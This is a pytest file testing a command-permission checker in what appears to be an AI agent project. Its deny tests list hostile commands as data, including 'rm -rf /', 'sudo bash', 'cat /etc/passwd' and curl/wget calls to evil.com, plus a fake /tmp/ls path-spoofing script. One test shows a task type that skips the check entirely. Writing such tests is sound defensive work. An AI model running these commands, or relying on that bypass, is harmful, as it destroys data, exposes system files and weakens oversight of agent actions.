import pytest
import os
import sys

# Import the module to test. Using the 8.0 version as an example.
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'dags'))
import frankenagent_8_0_kesselflow

def test_obey_rayrock_decree_allowed():
    # Valid allowed commands
    for cmd in ["ls", "echo hello", "git status", "pytest tests/", "python3 script.py"]:
        allowed, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("command", cmd)
        assert allowed is True
        assert msg is None
        assert tokens is not None

def test_obey_rayrock_decree_denied():
    # Invalid or unknown commands
    for cmd in ["rm -rf /", "sudo bash", "cat /etc/passwd", "curl http://evil.com", "wget http://evil.com"]:
        allowed, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("command", cmd)
        assert allowed is False
        assert "unauthorized by decree" in msg

def test_obey_rayrock_decree_python_flags():
    # Python with malicious flags
    for cmd in ["python3 -c 'import os; os.system(\"ls\")'", "python3 -m http.server"]:
        allowed, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("command", cmd)
        assert allowed is False
        assert "Arbitrary execution flags" in msg

def test_obey_rayrock_decree_empty():
    for cmd in ["", "   ", "\n"]:
        allowed, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("command", cmd)
        assert allowed is False
        assert "Empty command payload rejected" in msg

def test_obey_rayrock_decree_task_type():
    # Content creation bypasses the check but still works properly
    allowed, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("content_creation", "rm -rf /")
    assert allowed is True
    assert tokens == "rm -rf /"

def test_wrapper_bypass():
    import shutil
    # Create a malicious script named ls in /tmp
    bypass_path = "/tmp/ls"
    with open(bypass_path, "w") as f:
        f.write("#!/bin/bash\necho hacked")
    os.chmod(bypass_path, 0o755)

    # It should be blocked because /tmp/ls is not the same as shutil.which("ls")
    valid, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("command", "/tmp/ls")
    assert valid is False
    assert msg == "Invalid executable path for 'ls'."

    os.remove(bypass_path)

def test_absolute_path_valid():
    import shutil
    actual_ls = shutil.which("ls")
    valid, msg, tokens = frankenagent_8_0_kesselflow.obey_rayrock_decree("command", f"{actual_ls} -la")
    assert valid is True
    assert tokens[0] == actual_ls
